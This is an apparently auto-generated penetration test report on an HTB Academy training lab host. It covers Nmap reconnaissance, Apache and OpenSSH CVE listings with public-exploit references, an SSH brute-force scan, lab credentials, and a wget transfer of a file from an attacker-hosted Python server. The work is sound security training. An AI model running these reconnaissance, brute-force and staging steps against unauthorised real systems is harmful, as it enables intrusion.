# PENETRATION TESTING REPORT

## Linux File Transfers Security Assessment – ACADEMY-MISC-NIX04

HTB Academy Lab Environment – File Transfer Techniques Evaluation

## DATE_OF_TEST_EVENT

**Testing Period:** January 9, 2026  
**Timezone:** Local System Time (UTC offset: -30s observed per http-date scan)

---

## TABLE_OF_CONTENTS

1. [Document Revision History](#document-revision-history)
2. [Statement of Confidentiality](#statement-of-confidentiality)
3. [Engagement Contacts](#engagement-contacts)
4. [Executive Summary](#executive-summary)
5. [Network Penetration Test Assessment Summary](#network-penetration-test-assessment-summary)
6. [Finding PT-001: Outdated Apache HTTP Server with Multiple Known Vulnerabilities](#finding-id-pt-001)
7. [Finding PT-002: Outdated OpenSSH Server with Known Vulnerabilities](#finding-id-pt-002)
8. [Finding PT-003: Sensitive File Exposed in Web Root](#finding-id-pt-003)
9. [Finding PT-004: SSH Password Authentication Enabled](#finding-id-pt-004)
10. [Finding PT-005: Missing Standard System Utilities](#finding-id-pt-005)
11. [Internal Network Compromise Walkthrough](#internal-network-compromise-walkthrough)
12. [Remediation Summary](#remediation-summary)
13. [Appendices](#appendices)

---

## Document Revision History

| Author | Date | Version | Comment |
| ------ | ---- | ------- | ------- |
| Security Tester | 2026-01-09 | 1.0 | Initial draft – Automated report generation from scan logs |

---

## STATEMENT OF CONFIDENTIALITY

This document contains sensitive security information, including system architecture details, vulnerabilities, and exploitation techniques. Distribution is restricted to authorized personnel only. This assessment was conducted within the HTB Academy lab environment for educational purposes.

---

## ENGAGEMENT CONTACTS

| Contact | Title | Phone | Email |
| ------- | ----- | ----- | ----- |
| HTB Academy | Lab Provider | N/A | N/A |
| Security Tester | Penetration Tester | N/A | N/A |

*[ASSUMED: Contact information not provided in source materials]*

---

## EXECUTIVE SUMMARY

This section provides a high-level, non-technical overview of the penetration testing engagement conducted against target host 10.129.234.168 (ACADEMY-MISC-NIX04).

The assessment evaluated the security posture of a Linux-based file transfer lab environment. Testing focused on identifying vulnerabilities, exposed services, and demonstrating various file transfer techniques between attack and target systems.

**Overall, the assessment identified multiple high-severity vulnerabilities** primarily related to outdated software versions on both the web server (Apache 2.4.41) and SSH service (OpenSSH 8.2p1). The Nmap vulnerability scan identified over 100 potential CVEs and public exploits associated with these software versions.

Key concerns include:
- Apache HTTP Server version 2.4.41 with 50+ known CVEs (CVSS scores up to 9.8)
- OpenSSH 8.2p1 with 30+ known CVEs (CVSS scores up to 9.8)
- Sensitive file (`flag.txt`) directly accessible via web root without authentication
- SSH password authentication enabled, increasing brute-force attack surface

File transfer operations were successfully demonstrated using multiple techniques including wget, Python HTTP servers, and Python's `shutil` library for archive extraction.

---

### SCENARIOS INCLUDED

* **External Network Penetration Test** – Assessment of externally exposed services (SSH, HTTP) from an unauthenticated attacker perspective.
* **Credentialed Testing** – Targeted testing using provided SSH credentials (`htb-student`) to evaluate file transfer capabilities and system configuration.

---

### APPROACH

The assessment followed a structured penetration testing methodology:

1. **Reconnaissance** – Nmap scans (quick, vulnerability, service enumeration, SSH enumeration, HTTP enumeration, top 1000 ports)
2. **Enumeration** – Curl-based HTTP header analysis and content retrieval
3. **Exploitation** – File download via HTTP, SSH access with provided credentials
4. **Post-Exploitation** – File upload via Python HTTP server, archive extraction, command execution

All findings were validated through manual testing. Evidence was captured in scan logs and command output.

---

### SCOPE AND DURATION

| Host/IP/URL | Duration | Description |
| ----------- | -------- | ----------- |
| 10.129.234.168 | ~30 minutes | Primary target – ACADEMY-MISC-NIX04 Linux host |

*[Source: [nmap.log](scans/nmap.log) – timestamps 19:00:58 to 19:13:41]*

**In-Scope Services:**
- TCP/22 – SSH (OpenSSH 8.2p1)
- TCP/80 – HTTP (Apache 2.4.41)

*[Source: [nmap_quick.nmap](scans/nmap_quick.nmap) lines 1-10]*

---

### ASSESSMENT OVERVIEW AND RECOMMENDATIONS

The assessment revealed several critical themes:

1. **Severely Outdated Software** – Both primary services (Apache and OpenSSH) are running versions with numerous known vulnerabilities
2. **Improper Access Controls** – Sensitive files accessible without authentication
3. **Missing System Utilities** – Standard archive tools (unzip, etc.) not installed, requiring workarounds
4. **Password Authentication Enabled** – SSH allows password authentication, enabling potential brute-force attacks

**Priority Recommendations:**
1. **CRITICAL:** Update Apache HTTP Server to latest stable version (currently 2.4.58+)
2. **CRITICAL:** Update OpenSSH to latest stable version (currently 9.6+)
3. **HIGH:** Remove or protect sensitive files from web root
4. **MEDIUM:** Disable SSH password authentication in favor of key-based authentication
5. **LOW:** Install standard system utilities for operational efficiency

---

## NETWORK PENETRATION TEST ASSESSMENT SUMMARY

This section summarizes findings related specifically to network-level testing, including exposed services, protocol weaknesses, and configuration issues.

### SUMMARY OF FINDINGS

| Finding ID | Title | Severity | CVSS |
| ---------- | ----- | -------- | ---- |
| PT-001 | Outdated Apache HTTP Server with Multiple Known Vulnerabilities | Critical | 9.8 |
| PT-002 | Outdated OpenSSH Server with Known Vulnerabilities | Critical | 9.8 |
| PT-003 | Sensitive File Exposed in Web Root | High | 7.5 |
| PT-004 | SSH Password Authentication Enabled | Medium | 5.3 |
| PT-005 | Missing Standard System Utilities | Low | N/A |

**Key Observations:**
- Only 2 TCP ports open (22, 80) – minimal attack surface
- Web server returns 403 Forbidden on root path for standard browser user-agents
- Web server returns 200 OK for non-browser user-agents (wget, Python-urllib, etc.)
- SSH supports both password and public key authentication
- No public keys accepted on SSH

*[Source: [namp_http_enum.nmap](scans/namp_http_enum.nmap) lines 44-63, [nmap_ssh_enum.nmap](scans/nmap_ssh_enum.nmap) lines 50-55]*

---

## FINDING ID: PT-001

**Finding Title:** Outdated Apache HTTP Server with Multiple Known Vulnerabilities

**Severity:** Critical  
**Risk Rating:** CVSS v3.1: 9.8 – Critical (highest CVE score from vulners scan)

**Mapped Controls:**
- NIST 800-53: SI-2 (Flaw Remediation), CM-6 (Configuration Settings)
- RMF Families: SI, CM

**Impact:** Remote code execution, denial of service, information disclosure, and server-side request forgery depending on specific CVE exploited.

---

### SUMMARY

The target system is running Apache HTTP Server version 2.4.41 (Ubuntu), which is significantly outdated. The Nmap vulnerability scan identified over 100 associated CVEs and public exploits, with CVSS scores ranging from 5.3 to 9.8.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| ACADEMY-MISC-NIX04 | 10.129.234.168:80 | Web Server | HTB Academy Lab |

---

### VULNERABILITY TYPE

* Category: Patch Management, Outdated Software
* Associated weakness class: CWE-1104 (Use of Unmaintained Third Party Components)

---

### DESCRIPTION

Apache HTTP Server 2.4.41 was released on August 14, 2019. Multiple critical vulnerabilities have been discovered and patched in subsequent versions. The Nmap vulners script identified the following high-severity CVEs (partial list):

**Critical (CVSS 9.8):**
- CVE-2024-38476 – Apache HTTP Server may use exploitable/malicious backend application output
- CVE-2024-38474 – mod_rewrite substitution issue
- CVE-2023-25690 – HTTP Request Smuggling
- CVE-2022-31813 – X-Forwarded-* header bypass
- CVE-2022-23943 – mod_sed buffer overflow
- CVE-2022-22720 – HTTP Request Smuggling
- CVE-2021-44790 – mod_lua multipart parser buffer overflow
- CVE-2021-39275 – ap_escape_quotes buffer overflow
- CVE-2021-26691 – mod_session buffer overflow
- CVE-2020-11984 – mod_proxy_uwsgi buffer overflow

**High (CVSS 9.0-9.1):**
- CVE-2022-36760 – mod_proxy_ajp request smuggling
- CVE-2021-40438 – mod_proxy SSRF

*[Source: [nmap_vuln.nmap](scans/nmap_vuln.nmap) lines 64-200, service version confirmed in [nmap_svc_script.nmap](scans/nmap_svc_script.nmap) line 12]*

---

### ATTACK VECTOR

- **Network Access Requirements:** Remote network access to TCP/80
- **Authentication Requirements:** None (unauthenticated)
- **User Interaction:** None required for most exploits

An attacker with network access could exploit any of the identified vulnerabilities to achieve remote code execution, denial of service, or information disclosure without authentication.

---

### PROOF OF CONCEPT / EVIDENCE

```text
# From nmap_vuln.nmap lines 63-67
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| vulners: 
|   cpe:/a:apache:http_server:2.4.41: 
|     	PACKETSTORM:176334	9.8	https://vulners.com/packetstorm/PACKETSTORM:176334	*EXPLOIT*

# From curl.log lines 1-10
$ curl -I http://10.129.234.168/
HTTP/1.1 200 OK
Date: Sat, 10 Jan 2026 00:17:32 GMT
Server: Apache/2.4.41 (Ubuntu)
```

---

### EXPLOITATION DETAILS

Exploitation was **not performed** for RCE vulnerabilities during this assessment. The focus was on file transfer techniques rather than full system compromise. However, public exploits are readily available for multiple identified CVEs.

**Exploitability Assessment:** High – Multiple public exploits available on PacketStorm, ExploitDB, and GitHub.

---

### IMPACT

- **Data Exposure Risk:** Critical – RCE vulnerabilities could lead to complete data exfiltration
- **Privilege Escalation Potential:** High – Web server compromise could lead to lateral movement
- **Lateral Movement Capability:** High – Compromised web server could access internal network
- **Service Availability Concerns:** High – DoS vulnerabilities could cause service disruption

---

### LIKELIHOOD

- **Attacker Skill Level Required:** Low to Moderate (public exploits available)
- **Exposure Surface:** Internet-exposed service
- **Availability of Public Exploits:** High (50+ documented exploits)

**Overall Likelihood:** High

---

### RISK JUSTIFICATION

The combination of Critical impact and High likelihood results in a Critical overall risk rating. The availability of numerous public exploits significantly lowers the barrier to exploitation.

---

### RECOMMENDATIONS

**Immediate Mitigation Steps:**
1. Update Apache HTTP Server to the latest stable version (2.4.58 or newer)
2. Apply all available security patches
3. Implement a web application firewall (WAF) as temporary mitigation

**Long-Term Corrective Actions:**
1. Establish automated patch management process
2. Subscribe to Apache security mailing list
3. Implement vulnerability scanning as part of CI/CD pipeline

---

### VALIDATION / VERIFICATION STEPS

1. Run `apache2 -v` to verify updated version
2. Re-run Nmap vulnerability scan: `nmap -sV --script=vuln <target>`
3. Verify no critical CVEs reported for installed version

---

### REFERENCES

* CVE-2024-38476: https://nvd.nist.gov/vuln/detail/CVE-2024-38476
* CVE-2023-25690: https://nvd.nist.gov/vuln/detail/CVE-2023-25690
* CVE-2021-44790: https://nvd.nist.gov/vuln/detail/CVE-2021-44790
* Apache Security Advisories: https://httpd.apache.org/security/

*[SELF-GENERATED: References compiled from CVE identifiers found in scan logs]*

---

### STATUS

Open

---

### NOTES

The vulnerability scan identified 100+ potential vulnerabilities. Only the highest-severity items are detailed here. A complete remediation should address all identified CVEs.

---

## FINDING ID: PT-002

**Finding Title:** Outdated OpenSSH Server with Known Vulnerabilities

**Severity:** Critical  
**Risk Rating:** CVSS v3.1: 9.8 – Critical (highest CVE score from vulners scan)

**Mapped Controls:**
- NIST 800-53: SI-2 (Flaw Remediation), AC-17 (Remote Access)
- RMF Families: SI, AC

**Impact:** Remote code execution, authentication bypass, and information disclosure.

---

### SUMMARY

The target system is running OpenSSH 8.2p1 Ubuntu 4ubuntu0.1, which has multiple known vulnerabilities including CVE-2023-38408 (CVSS 9.8) affecting the ssh-agent PKCS#11 feature.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| ACADEMY-MISC-NIX04 | 10.129.234.168:22 | SSH Server | HTB Academy Lab |

---

### VULNERABILITY TYPE

* Category: Patch Management, Outdated Software
* Associated weakness class: CWE-1104 (Use of Unmaintained Third Party Components)

---

### DESCRIPTION

OpenSSH 8.2p1 was released on February 14, 2020. Multiple vulnerabilities have been identified:

**Critical (CVSS 9.8):**
- CVE-2023-38408 – ssh-agent PKCS#11 remote code execution

**High (CVSS 7.0-8.1):**
- CVE-2020-15778 – scp command injection (CVSS 7.8)
- CVE-2021-41617 – Privilege escalation via AuthorizedKeysCommand (CVSS 7.0)
- CVE-2021-28041 – Double-free in ssh-agent (CVSS 7.1)
- CVE-2025-26465 – Verification bypass vulnerability (CVSS 6.8)

**Medium (CVSS 5.3-6.5):**
- CVE-2023-48795 – Terrapin attack prefix truncation (CVSS 5.9)
- CVE-2020-14145 – Observable timing discrepancy (CVSS 5.9)
- CVE-2023-51385 – OS command injection (CVSS 6.5)

*[Source: [nmap_vuln.nmap](scans/nmap_vuln.nmap) lines 6-62, version confirmed in [nmap_svc_script.nmap](scans/nmap_svc_script.nmap) line 8]*

---

### ATTACK VECTOR

- **Network Access Requirements:** Remote network access to TCP/22
- **Authentication Requirements:** Varies by CVE (some require authentication, some do not)
- **User Interaction:** Some CVEs require user interaction (e.g., connecting to malicious server)

---

### PROOF OF CONCEPT / EVIDENCE

```text
# From nmap_vuln.nmap lines 5-18
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|     	CVE-2023-38408	9.8	https://vulners.com/cve/CVE-2023-38408
|     	PACKETSTORM:173661	9.8	https://vulners.com/packetstorm/PACKETSTORM:173661	*EXPLOIT*

# From nmap_ssh_enum.nmap lines 50-55
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
```

---

### EXPLOITATION DETAILS

Exploitation was **not performed** for SSH vulnerabilities during this assessment. SSH access was obtained using provided credentials for authorized testing purposes.

**Exploitability Assessment:** Moderate to High – Public exploits available for several CVEs.

---

### IMPACT

- **Data Exposure Risk:** Critical – SSH compromise grants shell access
- **Privilege Escalation Potential:** High – Some CVEs enable privilege escalation
- **Lateral Movement Capability:** High – SSH access enables lateral movement
- **Service Availability Concerns:** Moderate – Some DoS vectors exist

---

### LIKELIHOOD

- **Attacker Skill Level Required:** Moderate (exploits require specific conditions)
- **Exposure Surface:** Network-exposed SSH service
- **Availability of Public Exploits:** Moderate (condition-dependent)

**Overall Likelihood:** Moderate to High

---

### RISK JUSTIFICATION

Despite some CVEs requiring specific conditions, the critical severity of potential impacts and availability of public exploits warrant a Critical risk rating.

---

### RECOMMENDATIONS

**Immediate Mitigation Steps:**
1. Update OpenSSH to the latest stable version (9.6 or newer)
2. Apply OS-level security patches

**Long-Term Corrective Actions:**
1. Disable password authentication (use key-based only)
2. Implement fail2ban or similar intrusion prevention
3. Enable SSH key-only authentication with strong algorithms
4. Consider implementing SSH certificate-based authentication

---

### VALIDATION / VERIFICATION STEPS

1. Run `ssh -V` to verify updated version
2. Re-run Nmap vulnerability scan
3. Test that password authentication is disabled if recommended

---

### REFERENCES

* CVE-2023-38408: https://nvd.nist.gov/vuln/detail/CVE-2023-38408
* CVE-2023-48795 (Terrapin): https://terrapin-attack.com/
* OpenSSH Release Notes: https://www.openssh.com/releasenotes.html

*[SELF-GENERATED: References compiled from CVE identifiers found in scan logs]*

---

### STATUS

Open

---

## FINDING ID: PT-003

**Finding Title:** Sensitive File Exposed in Web Root

**Severity:** High  
**Risk Rating:** CVSS v3.1: 7.5 – High

**Mapped Controls:**
- NIST 800-53: AC-3 (Access Enforcement), SC-28 (Protection of Information at Rest)
- RMF Families: AC, SC

**Impact:** Unauthorized information disclosure.

---

### SUMMARY

A sensitive file (`flag.txt`) containing what appears to be a hash or token value is directly accessible via the web server without any authentication requirement.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| ACADEMY-MISC-NIX04 | 10.129.234.168/flag.txt | Web Server | HTB Academy Lab |

---

### VULNERABILITY TYPE

* Category: Information Disclosure, Access Control
* Associated weakness class: CWE-200 (Exposure of Sensitive Information)

---

### DESCRIPTION

The file `flag.txt` is stored in the web document root and is directly accessible without authentication. The file contains a 32-character hexadecimal string that appears to be an MD5 hash or authentication token.

While the root path (/) returns a 403 Forbidden error for standard browser user-agents, direct access to known files is permitted.

*[Source: [curl.log](scans/curl.log) lines 12-14]*

---

### ATTACK VECTOR

- **Network Access Requirements:** Remote network access to TCP/80
- **Authentication Requirements:** None
- **User Interaction:** None

---

### PROOF OF CONCEPT / EVIDENCE

```text
# From curl.log lines 12-14
$ curl http://10.129.234.168/flag.txt
5d21cf3da9c0ccb94f709e2559f3ea50
```

---

### EXPLOITATION DETAILS

The file was successfully retrieved using a simple curl command without any authentication or special techniques.

---

### IMPACT

- **Data Exposure Risk:** High – Sensitive data exposed to unauthenticated users
- **Privilege Escalation Potential:** Medium – Exposed credentials/tokens could enable further access
- **Lateral Movement Capability:** Medium – Depending on token use
- **Service Availability Concerns:** Low

---

### LIKELIHOOD

- **Attacker Skill Level Required:** Low (trivial directory/file enumeration)
- **Exposure Surface:** Direct URL access
- **Availability of Public Exploits:** N/A (configuration issue)

**Overall Likelihood:** High

---

### RISK JUSTIFICATION

The trivial nature of exploitation combined with direct information disclosure warrants a High risk rating.

---

### RECOMMENDATIONS

**Immediate Mitigation Steps:**
1. Remove sensitive files from web-accessible directories
2. Implement authentication for sensitive resources
3. Review web root for other sensitive files

**Long-Term Corrective Actions:**
1. Implement proper access controls (e.g., .htaccess rules)
2. Store sensitive files outside web document root
3. Conduct regular security reviews of web-accessible content

---

### VALIDATION / VERIFICATION STEPS

1. Attempt to access `http://target/flag.txt` – should return 403 or 404
2. Verify file is removed or protected

---

### REFERENCES

* CWE-200: https://cwe.mitre.org/data/definitions/200.html
* OWASP Information Disclosure: https://owasp.org/www-project-web-security-testing-guide/

*[SELF-GENERATED: References based on vulnerability classification]*

---

### STATUS

Open

---

## FINDING ID: PT-004

**Finding Title:** SSH Password Authentication Enabled

**Severity:** Medium  
**Risk Rating:** CVSS v3.1: 5.3 – Medium

**Mapped Controls:**
- NIST 800-53: IA-2 (Identification and Authentication), IA-5 (Authenticator Management)
- RMF Families: IA

**Impact:** Increased susceptibility to brute-force and credential-based attacks.

---

### SUMMARY

The SSH server accepts password-based authentication in addition to public key authentication. This configuration increases the attack surface for credential-based attacks.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| ACADEMY-MISC-NIX04 | 10.129.234.168:22 | SSH Server | HTB Academy Lab |

---

### VULNERABILITY TYPE

* Category: Authentication, Configuration
* Associated weakness class: CWE-307 (Improper Restriction of Excessive Authentication Attempts)

---

### DESCRIPTION

The SSH enumeration scan confirmed that the server accepts both `publickey` and `password` authentication methods. Password authentication enables brute-force attacks against user accounts.

The SSH brute-force scan performed 2,312 authentication attempts at approximately 3.7 attempts per second without triggering any apparent lockout mechanism.

*[Source: [nmap_ssh_enum.nmap](scans/nmap_ssh_enum.nmap) lines 50-55, 46-48]*

---

### ATTACK VECTOR

- **Network Access Requirements:** Remote network access to TCP/22
- **Authentication Requirements:** None (attempting to authenticate)
- **User Interaction:** None

---

### PROOF OF CONCEPT / EVIDENCE

```text
# From nmap_ssh_enum.nmap lines 46-55
| ssh-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 2312 guesses in 602 seconds, average tps: 3.7
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
```

---

### EXPLOITATION DETAILS

Credential-based access was obtained using credentials provided for the assessment (`htb-student`/`HTB_@cademy_stdnt!`). The weak password complexity and enabled password authentication would facilitate brute-force attacks.

*[Source: [tasks.md](tasks.md) – SSH credentials provided for testing]*

---

### IMPACT

- **Data Exposure Risk:** Medium – Successful brute-force grants shell access
- **Privilege Escalation Potential:** Medium – Shell access enables further attacks
- **Lateral Movement Capability:** Medium
- **Service Availability Concerns:** Low

---

### LIKELIHOOD

- **Attacker Skill Level Required:** Low (automated tools readily available)
- **Exposure Surface:** Network-exposed SSH
- **Availability of Public Exploits:** High (Hydra, Medusa, etc.)

**Overall Likelihood:** Moderate

---

### RISK JUSTIFICATION

While password authentication is common, the combination with no apparent rate limiting increases risk.

---

### RECOMMENDATIONS

**Immediate Mitigation Steps:**
1. Implement fail2ban or similar rate limiting
2. Enforce strong password policies
3. Consider disabling password authentication entirely

**Long-Term Corrective Actions:**
1. Migrate to key-only authentication (`PasswordAuthentication no` in sshd_config)
2. Implement SSH certificate-based authentication
3. Deploy multi-factor authentication for SSH

---

### VALIDATION / VERIFICATION STEPS

1. Test that password authentication is disabled: `ssh -o PreferredAuthentications=password user@target`
2. Verify fail2ban is active and blocking

---

### REFERENCES

* OpenSSH sshd_config: https://man.openbsd.org/sshd_config
* CWE-307: https://cwe.mitre.org/data/definitions/307.html

*[SELF-GENERATED: References based on vulnerability classification]*

---

### STATUS

Open

---

## FINDING ID: PT-005

**Finding Title:** Missing Standard System Utilities (unzip)

**Severity:** Low  
**Risk Rating:** N/A (Operational/Configuration Finding)

**Mapped Controls:**
- NIST 800-53: CM-2 (Baseline Configuration), SA-10 (Developer Configuration Management)
- RMF Families: CM, SA

**Impact:** Operational inconvenience; potential security impact if users employ insecure workarounds.

---

### SUMMARY

The target system lacks standard archive extraction utilities such as `unzip`. This required the use of Python's `shutil.unpack_archive()` function as a workaround to extract ZIP files.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| ACADEMY-MISC-NIX04 | 10.129.234.168 | Linux Host | HTB Academy Lab |

---

### VULNERABILITY TYPE

* Category: Configuration, System Hardening
* Associated weakness class: N/A (Operational finding)

---

### DESCRIPTION

During file transfer testing, the `unzip` utility was not available on the target system. Other standard archive utilities were also not found. This required using Python as an alternative method for archive extraction.

*[Source: [tasks.md](tasks.md) – Test Playbook: "attempted to unzip file, unzip not available on TARGET asset. no other ZIP binaries found"]*

---

### ATTACK VECTOR

N/A – This is an operational finding rather than a security vulnerability.

---

### PROOF OF CONCEPT / EVIDENCE

```text
# From tasks.md – Python workaround used
htb-student@nix04:~$ python3
Python 3.8.2 (default, Jul 16 2020, 14:00:26) 
[GCC 9.3.0] on linux
>>> import shutil
>>> zip_file = "upload_nix.zip"
>>> destination_dir = "."
>>> shutil.unpack_archive(zip_file, destination_dir)
>>> exit()
```

*[Source: [tasks.md](tasks.md) – Test Playbook section]*

---

### EXPLOITATION DETAILS

N/A – Not a security vulnerability.

---

### IMPACT

- **Operational Impact:** Low – Requires workarounds for common operations
- **Security Impact:** Low – May lead to use of less secure methods (e.g., downloading executables from untrusted sources)

---

### LIKELIHOOD

N/A

---

### RISK JUSTIFICATION

This is an operational finding that may indirectly impact security if users employ insecure workarounds.

---

### RECOMMENDATIONS

**Immediate Mitigation Steps:**
1. Install standard archive utilities: `apt install unzip zip p7zip-full`

**Long-Term Corrective Actions:**
1. Document required baseline packages in system configuration management
2. Automate baseline package installation during provisioning

---

### VALIDATION / VERIFICATION STEPS

1. Verify `unzip` is installed: `which unzip`
2. Test archive extraction: `unzip -l testfile.zip`

---

### REFERENCES

* Ubuntu Packages: https://packages.ubuntu.com/

---

### STATUS

Open

---

## INTERNAL NETWORK COMPROMISE WALKTHROUGH

*[LABELED: This section describes the actions performed during the assessment based on logged evidence. Where steps are inferred beyond logged actions, they are marked as [INFERRED].]*

### DETAILED WALKTHROUGH

#### Phase 1: Initial Reconnaissance

The assessment began with network reconnaissance using Nmap to identify open services.

**Quick Scan Results:**
```text
# Source: nmap_quick.nmap
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Scan time: 0.83 seconds
```

*[Source: [nmap_quick.nmap](scans/nmap_quick.nmap) lines 1-10]*

#### Phase 2: Service Enumeration

Multiple Nmap scans were executed to gather detailed service information:

| Scan Type | Command | Duration | Key Findings |
| --------- | ------- | -------- | ------------ |
| Quick | `nmap -F` | 0.83s | 2 ports open (22, 80) |
| Service/Script | `nmap -sV -sC` | 8.56s | OpenSSH 8.2p1, Apache 2.4.41 |
| Top 1000 | `nmap -sV --top-ports 1000` | 7.78s | Only ports 22, 80 open |
| Vulnerability | `nmap -sV --script=vuln` | 35.83s | 100+ CVEs identified |
| SSH Enum | `nmap -sV --script=ssh*` | 612.38s | Algorithms, auth methods |
| HTTP Enum | `nmap -sV --script=http*` | 1831.98s | Headers, user-agent behavior |

*[Source: [nmap.log](scans/nmap.log), individual scan files in scans/ directory]*

#### Phase 3: Web Server Analysis

HTTP header analysis was performed using curl:

```text
# Source: curl.log lines 1-10
$ curl -I http://10.129.234.168/
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 10918
Content-Type: text/html
```

The HTTP enumeration scan revealed interesting user-agent behavior:
- Standard browser user-agents receive 403 Forbidden
- Non-browser user-agents (wget, Python-urllib, curl) receive 200 OK

*[Source: [namp_http_enum.nmap](scans/namp_http_enum.nmap) lines 44-63]*

#### Phase 4: Sensitive File Retrieval

Direct file access was tested against the web server:

```text
# Source: curl.log lines 12-14
$ curl http://10.129.234.168/flag.txt
5d21cf3da9c0ccb94f709e2559f3ea50
```

The sensitive file `flag.txt` was retrieved without authentication, answering Question 1 of the assessment objectives.

*[Source: [curl.log](scans/curl.log) lines 12-14]*

#### Phase 5: SSH Access

SSH access was established using provided credentials:

| Parameter | Value |
| --------- | ----- |
| Target | 10.129.234.168 |
| Username | htb-student |
| Password | HTB_@cademy_stdnt! |
| Hostname | nix04 |

*[Source: [tasks.md](tasks.md) – Question 2 credentials]*

#### Phase 6: File Upload (Attack → Target)

**[INFERRED from playbook]:** A Python HTTP server was started on the attack host:

```bash
# Inferred command on ATTACK host
python3 -m http.server 8000
```

The payload was transferred to the target using wget:

```bash
# Inferred command on TARGET host
wget http://ATTACK_IP:8000/upload_nix.zip
```

*[Source: [tasks.md](tasks.md) – Test Playbook: "started python http.server on ATTACK asset", "used wget to download the payload from the ATTACK asset"]*

#### Phase 7: Archive Extraction

Due to missing `unzip` utility, Python's `shutil` module was used:

```python
# Source: tasks.md – exact code executed
htb-student@nix04:~$ python3
>>> import shutil
>>> zip_file = "upload_nix.zip"
>>> destination_dir = "."
>>> shutil.unpack_archive(zip_file, destination_dir)
>>> exit()
```

*[Source: [tasks.md](tasks.md) – Test Playbook section]*

#### Phase 8: Hash Generation

The extracted file was processed with the `hasher` script:

```text
# Source: tasks.md
htb-student@nix04:~$ hasher upload_nix.txt
159cfe5c65054bbadb2761cfa359c8b0
```

This hash was submitted to the HTB Academy portal, completing Question 2.

*[Source: [tasks.md](tasks.md) – Test Playbook section]*

---

### Attack Path Summary

```
[Attacker] 
    │
    ├─► Nmap Reconnaissance → Identified SSH (22) + HTTP (80)
    │
    ├─► curl http://target/flag.txt → Retrieved sensitive file (Q1)
    │
    ├─► SSH htb-student@target → Authenticated access
    │
    ├─► Python HTTP Server (Attack) ──► wget (Target) → File uploaded
    │
    └─► python3 shutil.unpack_archive() → hasher → Hash generated (Q2)
```

---

## REMEDIATION SUMMARY

This section provides a prioritized remediation roadmap based on risk and implementation effort.

### SHORT TERM (0-30 Days)

| Priority | Action | Affected Finding |
| -------- | ------ | ---------------- |
| CRITICAL | Update Apache HTTP Server to 2.4.58+ | PT-001 |
| CRITICAL | Update OpenSSH to 9.6+ | PT-002 |
| HIGH | Remove/protect sensitive files from web root | PT-003 |
| MEDIUM | Implement fail2ban for SSH protection | PT-004 |

### MEDIUM TERM (30-90 Days)

| Priority | Action | Affected Finding |
| -------- | ------ | ---------------- |
| MEDIUM | Disable SSH password authentication | PT-004 |
| MEDIUM | Implement web application firewall | PT-001 |
| LOW | Install standard system utilities | PT-005 |
| LOW | Review and harden system configuration | All |

### LONG TERM (90+ Days)

| Priority | Action | Affected Finding |
| -------- | ------ | ---------------- |
| HIGH | Establish automated patch management | PT-001, PT-002 |
| MEDIUM | Implement continuous vulnerability scanning | All |
| MEDIUM | Deploy SSH certificate-based authentication | PT-004 |
| LOW | Document baseline system configuration | PT-005 |

---

## TECHNICAL FINDINGS DETAILS

*[Note: Detailed technical findings are documented in the individual Finding sections above (PT-001 through PT-005).]*

---

### CAVEATS

1. Testing was conducted within an HTB Academy lab environment with known objectives and provided credentials
2. Vulnerability scan results are based on version fingerprinting; not all CVEs may be exploitable in this specific configuration
3. The assessment focused on file transfer techniques; full exploitation of identified vulnerabilities was not attempted
4. Absence of findings does not imply absence of vulnerabilities
5. Some system configuration details were not available (e.g., installed patches, kernel version)

---

## APPENDICES

### APPENDIX A – FINDING SEVERITIES

| Severity | CVSS Score Range | Description |
| -------- | ---------------- | ----------- |
| Critical | 9.0 - 10.0 | Immediate exploitation likely; severe impact |
| High | 7.0 - 8.9 | Exploitation possible; significant impact |
| Medium | 4.0 - 6.9 | Exploitation requires specific conditions; moderate impact |
| Low | 0.1 - 3.9 | Limited exploitability; minimal impact |
| Informational | N/A | Observation with no direct security impact |

---

### APPENDIX B – EXPLOITED HOSTS

| Host | IP Address | Access Method | Access Level |
| ---- | ---------- | ------------- | ------------ |
| ACADEMY-MISC-NIX04 | 10.129.234.168 | SSH (provided credentials) | User (htb-student) |

*[Source: [tasks.md](tasks.md) – provided SSH credentials used for authorized access]*

---

### APPENDIX C – COMPROMISED USERS

| Username | Host | Access Method | Source |
| -------- | ---- | ------------- | ------ |
| htb-student | nix04 | SSH password | Credentials provided for assessment |

*[Note: No unauthorized credential compromise occurred during this assessment]*

---

### APPENDIX D – CHANGES/HOST CLEANUP

| Action | Host | Description | Status |
| ------ | ---- | ----------- | ------ |
| File Upload | 10.129.234.168 | upload_nix.zip uploaded to /home/htb-student/ | Requires cleanup |
| File Extraction | 10.129.234.168 | upload_nix.txt extracted to /home/htb-student/ | Requires cleanup |

**Recommended Cleanup:**
```bash
rm /home/htb-student/upload_nix.zip
rm /home/htb-student/upload_nix.txt
```

*[SELF-GENERATED: Cleanup recommendations based on documented actions]*

---

### APPENDIX E – PASSWORD REVIEW

| Aspect | Observation | Risk |
| ------ | ----------- | ---- |
| Password Policy | Not assessed | Unknown |
| Password Complexity | Provided password contains special characters and mixed case | Moderate |
| Password Authentication | Enabled for SSH | Medium |
| Brute Force Protection | No apparent rate limiting observed | Medium |

**SSH Brute Force Statistics:**
- Attempts: 2,312 guesses
- Duration: 602 seconds
- Rate: 3.7 attempts/second average
- Result: No valid accounts found, no lockout triggered

*[Source: [nmap_ssh_enum.nmap](scans/nmap_ssh_enum.nmap) lines 46-48]*

---

